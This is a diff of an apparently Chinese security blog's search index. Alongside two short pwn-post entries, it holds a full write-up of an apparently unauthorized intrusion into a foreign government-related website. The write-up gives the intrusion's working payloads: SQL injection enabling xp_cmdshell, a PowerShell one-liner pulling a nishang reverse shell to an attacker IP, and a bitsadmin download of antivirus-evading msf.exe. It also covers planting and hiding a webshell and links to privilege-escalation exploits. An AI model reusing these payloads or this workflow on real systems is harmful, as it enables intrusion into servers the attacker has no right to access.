@@ -1,6 +1,34 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[深入理解GOT表和PLT表]]></title>
+    <url>%2F2020%2F02%2F08%2F1%2F</url>
+    <content type="text"><![CDATA[一起感受二进制魅力所在吧 0x1]]></content>
+      <categories>
+        <category>二进制安全</category>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>二进制安全</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[pwnable-fd.md]]></title>
+    <url>%2F2020%2F02%2F07%2F1%2F</url>
+    <content type="text"><![CDATA[想学二进制的pwn弟弟正在艰难的起步 0x1]]></content>
+      <categories>
+        <category>二进制安全</category>
+        <category>pwn</category>
+        <category>pwnable</category>
+      </categories>
+      <tags>
+        <tag>二进制安全</tag>
+        <tag>pwn</tag>
+        <tag>pwnable</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[渗透随笔-记一次境外网站渗透]]></title>
     <url>%2F2019%2F11%2F17%2F1%2F</url>
     <content type="text"><![CDATA[写下发生的故事，细品人生的乐趣。 0x1 Forward 前段时间，某位师傅找到国外政府网站的sql注入 拿到站点简单测试了下发现123数据库：mssql系统版本：windows服务器可以使用xp_cmdshell 执行1payload: aspx?AticalID=&apos;;use master;exec dbo.xp_cmdshell &apos;ping [服务器]&apos;;--+ 可以发现xp_cmdshell可使用，下一步就是找一下绝对路径，写shell直接拿下，在寻找绝对路径的时候，把url后面一部分上去后，会成功跳转到另一个网站 此时正式开始了 0x2 曲折的getshell获取绝对路径 很显然存在注入，但是不存在万能密码，可惜了，不过却可以从报错信息中发现绝对路径 此时把xp_cmdshell激活，然后把扩展库也激活1payload : admin&apos; exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;--+ 页面返回正常，应该是语句执行成功，于是ping一下服务器看一下时候可以使用，在这个时候有一个不错的收获，还想来源ip与之前那个政府站的ip是一样，猜测iis绑定了多个域名。 尝试写shell 此时先写一个txt文件试探一下是否可行 虽然返回正常，但是无法访问http://xxx.xxx.xxx/a.txt，找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell, 1C:\Users\&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress xxx.xxx.xxx.xxx -p 8080 但是360直接报毒，猜想这个办法行不通，试了一下果然不行，然后尝试远程下载我的服务器上的免杀msf，然后执行 1bitsadmin /transfer mydownloadjob /download /priority normal http://xxx.xxx.xxx.xxx/msf.exe %temp%/msf.exe 尝试去访问，网页404，查看apache日志，果然没有该ip的访问记录，这个办法pass，是不是杀软太强，或者权限太低，无法执行下载命令。然而就在走投无路的时候，事情出现了转机，在回过头来自习琢磨payload的时候，发现1c:\EMTTS Data\ 这个地方不对，本地尝试果真dos下路径有空格会报错，百度一波解决方法https://www.cnblogs.com/hoojjack/p/7010814.html 加上双引号后，重新构造payload，访问a.txt，有了收获 嘻嘻嘻，欢欢喜喜写shell 12这里普及一个小知识：&lt;&gt;在dos命令中需要转义，本地尝试了下，payload中知识&lt;&gt;需要转义。 访问a.aspx发现404，只能说需要上免杀，不过之前应该好奇看看是什么杀软（国外不会也用360吧23333） 12payload:tasklist &gt; &quot;c:\EMTTS Data\xxxx\xxx\b.txt&quot; 百度一下123ESET这一名称最早来源于埃及神话中的女神Isis。Isis又称作Aset或Eset，是地神Geb和天神Nut的女儿，是主管爱情和富庶的女神，也是负责治疗和魔力的女神。ESET在英文中可以理解为Essential Solution Against Evolving Threats 之后尝试写冰蝎马，虽然写进去了，访问时出错 冰蝎连接也不行，仔细检查语句，始终连接不上又是一个峰回路转，不断尝试新的payload，不同的姿势，终于使用 &gt;&gt; 追加符号写文件，居然可以成功getshell，仔细操作不多说，很简单的操作 至此成功getshell 提权 查看下系统信息，端口服务信息，路由信息 把补丁放在对比工具中 神器网站：https://bugs.hacking8.com/tiquan/另附几个：https://github.com/SecWiki/windows-kernel-exploits （补丁）、 https://www.uedbox.com/post/8744/ （本地提权工具） 现在先把shell文件加一个隐藏权限1234attrib +s +h a.aspxattrib命令 用于修改文件属性+s 设置系统文件属性+h 设置隐藏属性 但是发现权限不够，还是要提权，试过上传免杀msfpayload，但是通信时被杀，此方法pass，于是根据检查出来的漏洞进行提权（该方法后续尝试），因为是iis，直接祭出iis通杀0day 当然其他的方法也是可以的，后来用ms16-032也可以提权成功附网址:https://github.com/1234xxh/windows-kernel-exploits/tree/master/MS16-032 (fork来的) 发现3389设计开着的，直接远程连接 进去后找到这搞鬼的的东西 开始艰难的内网渗透（持续更新…） 感谢梦师傅的耐心指导，tql，我就是你的迷弟…]]></content>
@@ -65,8 +93,8 @@
         <category>hash长度扩展攻击</category>
       </categories>
       <tags>
-        <tag>hash长度扩展攻击</tag>
         <tag>CTF</tag>
+        <tag>hash长度扩展攻击</tag>
       </tags>
   </entry>
 </search>
